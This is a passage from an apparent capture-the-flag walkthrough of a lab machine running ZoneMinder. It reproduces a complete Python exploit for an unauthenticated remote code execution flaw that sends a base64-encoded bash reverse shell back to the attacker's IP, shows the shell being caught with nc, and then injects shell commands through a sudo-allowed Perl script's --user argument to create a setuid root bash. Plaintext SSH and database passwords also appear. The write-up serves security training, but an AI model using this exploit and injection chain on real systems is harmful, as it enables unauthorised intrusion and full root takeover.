<span class=sr-only>Link to heading</span></a></h2><ul><li>Once inside, if I search for local ports open I can see a couple that were not previously registered:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>matthew@surveillance:~$ ss -ntlp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>State               Recv-Q              Send-Q                           Local Address:Port                            Peer Address:Port              Process
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   80                                   127.0.0.1:3306                                 0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   511                                  127.0.0.1:8080                                 0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   511                                    0.0.0.0:80                                   0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                             127.0.0.53%lo:53                                   0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   128                                    0.0.0.0:22                                   0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   128                                       [::]:22                                      [::]:*
</span></span></span></code></pre></div><p>So we have a <code>MySQL</code> running on port <code>3306</code> (as usual), and something running on port <code>8080</code></p><ul><li>To check if it is a service that can be displayed through an internet browser such as <code>Firefox</code>, I like to first use <code>cURL</code> and check the output:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>matthew@surveillance:~$ curl -s http://127.0.0.1:8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;html lang=&#34;en&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;title&gt;ZM - Login&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>var failed = false;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;script src=&#34;skins/classic/views/js/login.js&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;script src=&#34;skins/classic/js/skin.js&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;script src=&#34;js/logger.js&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;script nonce=&#34;f3e94bd4e8a1388222a111d79663f97d&#34;&gt;$j(&#39;.chosen&#39;).chosen();&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;script nonce=&#34;f3e94bd4e8a1388222a111d79663f97d&#34;&gt;CsrfMagic.end();&lt;/script&gt;&lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;/html&gt;
</span></span></span></code></pre></div><p>Since we have some output, I suspect it is a site.</p><ul><li>To be able to visit this site, and since we have <code>SSH</code> credentials, I will try a <code>Local Port Forwarding</code>. I log out from my current <code>SSH</code> session, and re-connect to the target machine via <code>SSH</code>, but this time I will also add <code>-L 1234:127.0.0.1:8080</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;starcraft122490&#39; ssh -o stricthostkeychecking=no -L 1234:127.0.0.1:8080 matthew@10.10.11.245
</span></span></span></code></pre></div><p>With this I convert my localhost port <code>1234</code> into the target port <code>8080</code>.</p><ul><li>So now I open an internet browser (in my case I use <code>Firefox</code>) and visit <code>http://127.0.0.1:1234</code>. And I can see a webpage:
<img alt=Surveillance_8.png src=/pentesting/images/Surveillance_8.png></li><li>Apparently, this site is running <code>ZoneMinder</code></li></ul><blockquote><p><code>ZoneMinder</code> is a free, open-source software application for monitoring</p></blockquote><ul><li>To check the version, we can run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>matthew@surveillance:~$ dpkg -l | grep zoneminder
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>hi  zoneminder                            1.36.32+dfsg1-1                         amd64        video camera security and surveillance solution
</span></span></span></code></pre></div><p>so the version is <code>1.36.32</code></p><ul><li>Using <code>SearchSploit</code> I look for <code>ZoneMinder</code> exploits:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ searchsploit zoneminder
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-------------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go> Exploit Title                                          |  Path
</span></span></span><span class=line><span class=cl><span class=go>-------------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>ZoneMinder 1.24.3 - Remote File Inclusion               | php/webapps/17593.txt
</span></span></span><span class=line><span class=cl><span class=go>Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injec | php/webapps/41239.txt
</span></span></span><span class=line><span class=cl><span class=go>ZoneMinder 1.32.3 - Cross-Site Scripting                | php/webapps/47060.txt
</span></span></span><span class=line><span class=cl><span class=go>Zoneminder &lt; v1.37.24 - Log Injection &amp; Stored XSS &amp; CS | php/webapps/51071.py
</span></span></span><span class=line><span class=cl><span class=go>ZoneMinder Snapshots &lt; 1.37.33 - Unauthenticated RCE    | php/webapps/51902.py
</span></span></span><span class=line><span class=cl><span class=go>ZoneMinder Video Server - packageControl Command Execut | unix/remote/24310.rb
</span></span></span><span class=line><span class=cl><span class=go>-------------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Shellcodes: No Results
</span></span></span></code></pre></div><p>Exploit <code>51902</code> looks promising, since it fits with our version.</p><ul><li>Looking at the exploit we have to run it in our machine, since it requires a not built-in <code>python3</code> library (<code>BeautifulSoap</code>). But this is no problem since we have the <code>Local Port Forwarding</code> established. The exploit is:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bs4</span> <span class=kn>import</span> <span class=n>BeautifulSoup</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Exploit Title: Unauthenticated RCE in ZoneMinder Snapshots</span>
</span></span><span class=line><span class=cl><span class=c1># Date: 12 December 2023</span>
</span></span><span class=line><span class=cl><span class=c1># Discovered by : @Unblvr1</span>
</span></span><span class=line><span class=cl><span class=c1># Exploit Author: Ravindu Wickramasinghe (@rvizx9)</span>
</span></span><span class=line><span class=cl><span class=c1># Vendor Homepage: https://zoneminder.com/</span>
</span></span><span class=line><span class=cl><span class=c1># Software Link: https://github.com/ZoneMinder/zoneminder</span>
</span></span><span class=line><span class=cl><span class=c1># Version: prior to 1.36.33 and 1.37.33</span>
</span></span><span class=line><span class=cl><span class=c1># Tested on: Arch Linux, Kali Linux</span>
</span></span><span class=line><span class=cl><span class=c1># CVE : CVE-2023-26035</span>
</span></span><span class=line><span class=cl><span class=c1># Github Link : https://github.com/rvizx/CVE-2023-26035</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ZoneMinderExploit</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>target_uri</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>target_uri</span> <span class=o>=</span> <span class=n>target_uri</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>csrf_magic</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>fetch_csrf_token</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[&gt;] fetching csrt token&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>target_uri</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>csrf_magic</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>get_csrf_magic</span><span class=p>(</span><span class=n>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=n>re</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;^key:[a-f0-9]</span><span class=si>{40}</span><span class=s1>,\d+&#39;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>csrf_magic</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[&gt;] recieved the token: </span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>csrf_magic</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] unable to fetch or parse token.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_csrf_magic</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>response</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>BeautifulSoup</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=s1>&#39;html.parser&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>,</span> <span class=p>{</span><span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;__csrf_magic&#39;</span><span class=p>})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;value&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>execute_command</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[&gt;] sending payload..&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;view&#39;</span><span class=p>:</span> <span class=s1>&#39;snapshot&#39;</span><span class=p>,</span> <span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;create&#39;</span><span class=p>,</span> <span class=s1>&#39;monitor_ids[0][Id]&#39;</span><span class=p>:</span> <span class=sa>f</span><span class=s1>&#39;;</span><span class=si>{</span><span class=n>cmd</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;__csrf_magic&#39;</span><span class=p>:</span> <span class=bp>self</span><span class=o>.</span><span class=n>csrf_magic</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>target_uri</span><span class=si>}</span><span class=s2>/index.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[&gt;] payload sent&#34;</span> <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=k>else</span> <span class=s2>&#34;[!] failed to send payload&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>exploit</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_csrf_token</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[&gt;] executing...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>execute_command</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-t&#39;</span><span class=p>,</span> <span class=s1>&#39;--target-url&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;target url endpoint&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-ip&#39;</span><span class=p>,</span> <span class=s1>&#39;--local-ip&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;local ip&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-p&#39;</span><span class=p>,</span> <span class=s1>&#39;--port&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;port&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># generating the payload</span>
</span></span><span class=line><span class=cl>    <span class=n>ps1</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/</span><span class=si>{</span><span class=n>args</span><span class=o>.</span><span class=n>local_ip</span><span class=si>}</span><span class=s2>/</span><span class=si>{</span><span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=si>}</span><span class=s2> 0&gt;&amp;1&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>ps2</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>ps1</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;echo </span><span class=si>{</span><span class=n>ps2</span><span class=si>}</span><span class=s2> | base64 -d | /bin/bash&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ZoneMinderExploit</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>target_url</span><span class=p>)</span><span class=o>.</span><span class=n>exploit</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>and it sends directly a reverse shell to an IP and listening port.</p><ul><li>So I start, in another shell, a listener with <code>nc</code> on port <code>443</code> and run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 zoneminder_snapshot_unauth_rce.py -t http://127.0.0.1:1234 -ip 10.10.16.6 -p 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[&gt;] fetching csrt token
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] recieved the token: key:0bfb5b839801ff10b9a9a6d91775fcd0e69aeecc,1713488472
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] executing...
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] sending payload..
</span></span></span></code></pre></div><p>and in my <code>nc</code> listener I get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.245] 43902
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (1086): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>zoneminder@surveillance:/usr/share/zoneminder/www$ whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>zoneminder
</span></span></span></code></pre></div><ul><li>Once in as <code>zoneminder</code> user, I can see it can run a command without password as <code>sudo</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Matching Defaults entries for zoneminder on surveillance:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User zoneminder may run the following commands on surveillance:
</span></span></span><span class=line><span class=cl><span class=go>    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
</span></span></span></code></pre></div><ul><li>So we can run any file that starts with <code>zm</code>, then have letters (so we cannot use <code>../</code>) and ends with <code>.pl</code> (i.e., it is a <code>Perl</code> script) inside <code>/usr/bin</code> folder. Basically the script says that the file must start with <code>/usr/bin/zm</code>, then only letters, and end with <code>.pl</code>. If I check the files I can see:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/usr/share/zoneminder/www$ find /usr/bin -name &#34;zm*.pl&#34; -exec ls -la {} \; 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-rwxr-xr-x 1 root root 5340 Nov 23  2022 /usr/bin/zmtrack.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 13994 Nov 23  2022 /usr/bin/zmpkg.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 6043 Nov 23  2022 /usr/bin/zmcontrol.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 5640 Nov 23  2022 /usr/bin/zmonvif-probe.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 8205 Nov 23  2022 /usr/bin/zmvideo.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 13111 Nov 23  2022 /usr/bin/zmtelemetry.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 2133 Nov 23  2022 /usr/bin/zmsystemctl.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 19386 Nov 23  2022 /usr/bin/zmonvif-trigger.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 7022 Nov 23  2022 /usr/bin/zmwatch.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 26232 Nov 23  2022 /usr/bin/zmdc.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 4815 Nov 23  2022 /usr/bin/zmstats.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 18482 Nov 23  2022 /usr/bin/zmtrigger.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 19655 Nov 23  2022 /usr/bin/zmx10.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 35206 Nov 23  2022 /usr/bin/zmfilter.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 12939 Nov 23  2022 /usr/bin/zmcamtool.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 43027 Nov 23  2022 /usr/bin/zmaudit.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 45421 Nov 23  2022 /usr/bin/zmupdate.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 17492 Nov 23  2022 /usr/bin/zmrecover.pl
</span></span></span></code></pre></div><p>so we can run any of these files as <code>root</code>.</p><ul><li>After checking some files I find <code>/usr/bin/zmupdate.pl</code>. If we just run it we get:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Database already at version 1.36.32, update skipped.
</span></span></span></code></pre></div><p>but checking its options I can see:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --help
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Unknown option: help
</span></span></span><span class=line><span class=cl><span class=go>Usage:
</span></span></span><span class=line><span class=cl><span class=go>    zmupdate.pl -c,--check | -f,--freshen | -v&lt;version&gt;,--version=&lt;version&gt;
</span></span></span><span class=line><span class=cl><span class=go>    [-u &lt;dbuser&gt; -p &lt;dbpass&gt;]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Options:
</span></span></span><span class=line><span class=cl><span class=go>    -c, --check - Check for updated versions of ZoneMinder -f, --freshen -
</span></span></span><span class=line><span class=cl><span class=go>    Freshen the configuration in the database. Equivalent of old zmconfig.pl
</span></span></span><span class=line><span class=cl><span class=go>    -noi --migrate-events - Update database structures as per
</span></span></span><span class=line><span class=cl><span class=go>    USE_DEEP_STORAGE setting. -v &lt;version&gt;, --version=&lt;version&gt; - Force
</span></span></span><span class=line><span class=cl><span class=go>    upgrade to the current version from &lt;version&gt; -u &lt;dbuser&gt;,
</span></span></span><span class=line><span class=cl><span class=go>    --user=&lt;dbuser&gt; - Alternate DB user with privileges to alter DB -p
</span></span></span><span class=line><span class=cl><span class=go>    &lt;dbpass&gt;, --pass=&lt;dbpass&gt; - Password of alternate DB user with
</span></span></span><span class=line><span class=cl><span class=go>    privileges to alter DB -s, --super - Use system maintenance account on
</span></span></span><span class=line><span class=cl><span class=go>    debian based systems instead of unprivileged account -d &lt;dir&gt;,
</span></span></span><span class=line><span class=cl><span class=go>    --dir=&lt;dir&gt; - Directory containing update files if not in default build
</span></span></span><span class=line><span class=cl><span class=go>    location -interactive - interact with the user -nointeractive - do not
</span></span></span><span class=line><span class=cl><span class=go>    interact with the user
</span></span></span></code></pre></div><p>so, even if <code>--help</code> option does not exists, it helped me. There is a <code>-v</code> or <code>--version</code> that asks for a version.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --version 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Initiating database upgrade to version 1.36.32 from version 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
</span></span></span><span class=line><span class=cl><span class=go>Press enter to continue or ctrl-C to abort :
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Upgrading DB to 1.30.1 from 1.26.0
</span></span></span><span class=line><span class=cl><span class=go>ERROR 1136 (21S01) at line 8: Column count doesn&#39;t match value count at row 1
</span></span></span><span class=line><span class=cl><span class=go>Output:
</span></span></span><span class=line><span class=cl><span class=go>Command &#39;mysql -uzmuser -p&#39;ZoneMinderPassword2023&#39; -hlocalhost zm &lt; /usr/share/zoneminder/db/zm_update-1.30.1.sql&#39; exited with status: 1
</span></span></span></code></pre></div><p>so it worked, but throw an error at the end.</p><ul><li>I also note that this script asks for a user and a password (possibly for the database). If I pass a user and a password that are commands, there is an output that is interpreting it:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --version 1 --user=&#39;$(id)&#39; -p=&#39;$(whoami)&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Initiating database upgrade to version 1.36.32 from version 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
</span></span></span><span class=line><span class=cl><span class=go>Press enter to continue or ctrl-C to abort :
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Do you wish to take a backup of your database prior to upgrading?
</span></span></span><span class=line><span class=cl><span class=go>This may result in a large file in /tmp/zm if you have a lot of events.
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;y&#39; for a backup or &#39;n&#39; to continue : y
</span></span></span><span class=line><span class=cl><span class=go>Creating backup to /tmp/zm/zm-1.dump. This may take several minutes.
</span></span></span><span class=line><span class=cl><span class=go>mysqldump: Got error: 1698: &#34;Access denied for user &#39;uid=0(root)&#39;@&#39;localhost&#39;&#34; when trying to connect
</span></span></span><span class=line><span class=cl><span class=go>Output:
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>so it is interpreting my code as <code>--user</code> parameter.</p><ul><li>Therefore, I decide to inject:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --version 1 --user=&#39;$(cp /usr/bin/bash /tmp/gunzf0x ; chmod 4755 /tmp/gunzf0x)&#39; -p=&#39;$(whoami)&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Initiating database upgrade to version 1.36.32 from version 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
</span></span></span><span class=line><span class=cl><span class=go>Press enter to continue or ctrl-C to abort :
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Do you wish to take a backup of your database prior to upgrading?
</span></span></span><span class=line><span class=cl><span class=go>This may result in a large file in /tmp/zm if you have a lot of events.
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;y&#39; for a backup or &#39;n&#39; to continue : y
